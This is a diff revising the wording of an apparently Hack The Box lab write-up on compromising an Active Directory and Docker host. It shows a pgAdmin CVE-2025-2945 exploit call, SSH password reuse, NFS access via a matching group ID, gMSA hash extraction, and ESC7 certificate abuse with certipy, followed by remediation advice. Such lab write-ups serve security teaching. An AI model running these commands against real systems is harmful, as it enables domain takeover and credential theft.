@@ -49,11 +49,11 @@ Fries is a Medium-rated Hack The Box Windows Active Directory lab with a dual-OS
 
 ## A dual-OS lab, container tier, and a web credential
 
-- **Target:** a Windows Active Directory domain controller (Kerberos, LDAP, DNS, SMB, WinRM) and a Linux host (SSH, nginx) sharing one address — an intentionally dual-OS lab.
-- **Container services:** five Docker containers form the application tier — Gitea, PostgreSQL, pgAdmin 4, PWM, and a web front end.
+- **Target:** a Windows Active Directory domain controller (Kerberos, LDAP, DNS, SMB, WinRM) and a Linux host (SSH, nginx) sharing one address: an intentionally dual-OS lab.
+- **Container services:** five Docker containers form the application tier: Gitea, PostgreSQL, pgAdmin 4, PWM, and a web front end.
 - **Starting position:** a provided Gitea account, with no domain credentials.
 - **Objective:** move from the provided web credential to domain-wide administrative control by abusing credential reuse, container orchestration, and a certificate-authority misconfiguration.
-- **Constraints:** activity was confined to the Hack The Box lab environment.
+- **Constraints:** all activity stayed inside the Hack The Box lab environment.
 
 ## Evidence: Gitea leak to container and CA control
 
@@ -83,7 +83,7 @@ Found: <SOURCE_CONTROL_HOST> Status: 200 [Size: 13591]
 
 Significance: the SSH/nginx services indicate a Linux host, while Kerberos, LDAP, and WinRM indicate a domain controller; virtual-host discovery exposes an otherwise unreachable Gitea web application at `<SOURCE_CONTROL_HOST>`.
 
-Result: the dual-OS architecture is confirmed and a Gitea instance is identified for review.
+Result: the scan confirms the dual-OS architecture and identifies a Gitea instance for review.
 
 ### 2. Repository Credential Leak and pgAdmin 4 CVE-2025-2945 RCE
 
@@ -93,7 +93,7 @@ Observation: repository history exposes a `.env` file with a database connection
 DATABASE_URL: <DATABASE_USER>:<DATABASE_PASSWORD>@<DATABASE_HOST>:5432
 ```
 
-The referenced panel runs pgAdmin 4 version 9.1, which is vulnerable to CVE-2025-2945 (fixed in 9.2). The provided Gitea credential and the leaked database credential are combined to invoke the exploit.
+The referenced panel runs pgAdmin 4 version 9.1, which is vulnerable to CVE-2025-2945 (fixed in 9.2). The exploit uses the provided Gitea credential together with the leaked database credential.
 
 ```bash
 python3 poc.py \
@@ -129,7 +129,7 @@ Observation: the password exposed in the pgAdmin container environment is reused
 sshpass -p '<REUSED_PASSWORD>' ssh -o PreferredAuthentications=password <SERVICE_USER>@<TARGET_IP>
 ```
 
-A separate password check against SSH returns a valid hit for the service account:
+I checked the same password against SSH in a separate run, and it returned a valid hit for the service account:
 
 ```text
 [22][ssh] host: <TARGET_IP>  login: <SERVICE_USER>  password: <REUSED_PASSWORD>
@@ -148,7 +148,7 @@ Observation: NFS exports are reachable from Docker internal networks but not dir
 sudo mount -t nfs 127.0.0.1:/ /mnt/<NFS_MOUNT> -o nolock
 ```
 
-The export enforces access with a numeric GID, so a matching local group is created to read it:
+The export enforces access with a numeric GID, so I created a matching local group to read it:
 
 ```bash
 sudo groupadd -g <NFS_GID> nfs_temp
@@ -244,13 +244,13 @@ GET-DESC... User: <GMSA_ACCOUNT>  description: GroupManagedServiceAccount used f
 LDAP  <TARGET_IP>  389  <DOMAIN_CONTROLLER_HOST>  Account: <GMSA_ACCOUNT>  NTLM: <GMSA_NTLM_HASH>  PrincipalsAllowedToReadPassword: <INFRASTRUCTURE_SERVICE_ACCOUNT>
 ```
 
-Significance: a gMSA password is readable by any principal named in `PrincipalsAllowedToReadPassword`, so the captured account can retrieve the managed account's NTLM hash directly, without cracking.
+Significance: a gMSA password is readable by any principal named in `PrincipalsAllowedToReadPassword`, so the captured account can retrieve the managed account's NTLM hash directly rather than by cracking.
 
 Result: the NTLM hash of the certificate-authority service account is recovered.
 
 ### 8. ESC7 Certificate Abuse
 
-Observation: certificate-authority enumeration reports ESC7 — insecure delegated security roles — with `BUILTIN\Administrators` as owner.
+Observation: certificate-authority enumeration reports ESC7 (insecure delegated security roles), with `BUILTIN\Administrators` as owner.
 
 ```text
 Vulnerabilities
@@ -270,7 +270,7 @@ $configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAut
 Restart-Service certsvc
 ```
 
-The `EditFlags` change is recorded as applied; the verification command's output was not retained:
+The `EditFlags` change is recorded as applied, but I could not verify it: the verification command's output was not retained:
 
 ```powershell
 certutil.exe -config "<CA_FQDN>\<CA_NAME>" -getreg "policy\EditFlags"
@@ -282,7 +282,7 @@ The Administrator SID is retrieved for the certificate request:
 Get-ADUser administrator -Properties SID | Select-Object -ExpandProperty SID
 ```
 
-A certificate is then requested for the Administrator identity using the `User` template with an explicit UPN and SID, and authentication with the resulting certificate returns the Administrator hash:
+A certificate request then targets the Administrator identity using the `User` template with an explicit UPN and SID, and authentication with the resulting certificate returns the Administrator hash:
 
 ```bash
 certipy req -u '<INFRASTRUCTURE_SERVICE_ACCOUNT>@<TARGET_DOMAIN>' -p '<INFRASTRUCTURE_SERVICE_PASSWORD>' -dc-ip <TARGET_IP> -ca '<CA_NAME>' -template 'User' -upn 'administrator@<TARGET_DOMAIN>' -sid '<ADMIN_SID>' -dynamic-endpoint
@@ -308,13 +308,13 @@ Result: certificate authentication for the Administrator identity succeeds and r
 
 ## Outcome: Administrator hash through ESC7 certificate abuse
 
-The evidence establishes an end-to-end path from a provided web application credential to Administrator-equivalent control of the domain, resting on widespread credential reuse and layered misconfiguration rather than a single critical exploit; CVE-2025-2945 is the only software vulnerability in the path.
+The evidence establishes an end-to-end path from a provided web application credential to Administrator-equivalent control of the domain, built on credential reuse across services and multiple misconfigurations rather than one critical exploit; CVE-2025-2945 is the only software vulnerability in the path.
 
-Limitations: the recovered secret values, the domain SID, and the hash outputs are redacted here, so the credential values themselves are not reproducible from this writeup. The exploit payload is summarized rather than reproduced.
+Limitations: the recovered secret values, the domain SID, and the hash outputs are redacted here, so the credential values themselves are not reproducible from this writeup. The exploit payload appears only as a summary.
 
 ## Recommendations: repo secrets, reuse, Docker keys, gMSA, and ESC7
 
-Each finding pairs the observed root cause with its demonstrated impact and a prioritized action. The actions are recommendations; none was validated in the lab.
+The actions are recommendations; none was validated in the lab.
 
 1. **Secrets in repository history.** A committed `.env` file exposed a database connection string, which fed the pgAdmin exploit. *Recommendation:* keep secrets out of version control, rotate any credential that has ever been committed, and scan history and history rewrites with a secret scanner. *Detection:* alert on credential-shaped strings in commits and on access to management panels using database superuser accounts.
 2. **Unpatched management interface.** The exposed pgAdmin 4 panel ran a version with a known remote code execution flaw. *Recommendation:* track and promptly apply upstream releases for internet- or network-reachable management tooling, and place such interfaces behind authentication and network segmentation rather than exposing them on an internal hostname. *Detection:* inventory management-service versions and alert on unexpected outbound connections from containerized services.
